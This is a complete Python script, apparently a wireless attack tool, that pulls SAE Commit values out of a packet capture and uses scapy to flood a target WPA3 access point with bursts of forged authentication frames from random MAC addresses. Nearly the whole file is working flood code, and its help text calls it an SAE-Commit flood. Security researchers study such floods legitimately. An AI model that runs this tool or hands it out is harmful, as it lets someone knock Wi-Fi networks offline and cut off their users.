#!/usr/bin/env python3
import argparse
import random
import sys
import os
import subprocess

from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, rdpcap

def extract_sae_commit_values(pcap_file):
    """
    Extract 32-byte scalar and finite-field elements from SAE Commit frames in a PCAP.
    """
    packets = rdpcap(pcap_file)

    scalars = []
    finites = []
    for pkt in packets:
        if pkt.haslayer(Dot11Auth) and len(pkt) > 140:
            auth_payload = bytes(pkt[Dot11Auth])
            scalars.append(auth_payload[-64:-32])
            finites.append(auth_payload[-32:])

    return scalars, finites

def rand_mac():
    """Generate a random unicast MAC address"""
    return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

def auth_frame(bssid):
    client = rand_mac()
    return (
        RadioTap() /
        Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid) /
        Dot11Auth(algo=3, seqnum=1, status=0)
    )

def construct_commit(bssid, scalar_list, finite_list):
    """Build one SAE-Commit frame using a random extracted scalar + finite element."""
    return auth_frame(bssid) / b'\x13\x00' / random.choice(scalar_list) / random.choice(finite_list)

def check_interface(iface):
    """Ensure the interface exists and is in monitor mode."""
    net_ifaces = os.listdir('/sys/class/net')
    if iface not in net_ifaces:
        print(f"ERROR: Interface '{iface}' not found!", file=sys.stderr)
        sys.exit(1)
    try:
        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
        if 'Mode:Monitor' not in result.stdout:
            print(f"ERROR: Interface '{iface}' is not in monitor mode!", file=sys.stderr)
            sys.exit(1)
    except Exception:
        pass

def attack(bssid, iface, num_bursts, scalar_list, finite_list):
    """
    Send num_bursts of SAE-Commit frame bursts, each 128 frames spaced by 0.0001s.
    """
    if not scalar_list or not finite_list:
        print("ERROR: No scalars or finite elements extracted—nothing to send.", file=sys.stderr)
        sys.exit(1)

    BURST_SIZE = 128   # fixed number of frames per burst
    INTERVAL = 0.0001  # fixed inter-packet interval in seconds

    for burst in range(num_bursts):
        frame = construct_commit(bssid, scalar_list, finite_list)
        sendp(
            frame,
            iface=iface,
            count=BURST_SIZE,
            inter=INTERVAL,
            verbose=False
        )

    print(f"Done: {num_bursts * BURST_SIZE} frames injected in {num_bursts} bursts.")

def parse_args():
    p = argparse.ArgumentParser(
        description="SAE-Commit flood using extracted scalars & finite elements from a PCAP"
    )
    p.add_argument('-f', '--file',
                   required=True,
                   help="PCAP file containing SAE-Commit frames")
    p.add_argument('-i', '--iface',
                   required=True,
                   help="Monitor-mode interface (e.g., wlan0mon)")
    p.add_argument('-b', '--bssid',
                   required=True,
                   help="Target AP BSSID")
    p.add_argument('-n', '--count',
                   required=True, type=int,
                   help="Number of bursts (each burst is 128 frames)")
    return p.parse_args()

def main():
    args = parse_args()
    check_interface(args.iface)
    scalars, finites = extract_sae_commit_values(args.file)
    print(f"Extracted {len(scalars)} scalars and {len(finites)} finite elements")
    attack(
        bssid=args.bssid,
        iface=args.iface,
        num_bursts=args.count,
        scalar_list=scalars,
        finite_list=finites
    )

if __name__ == "__main__":
    main()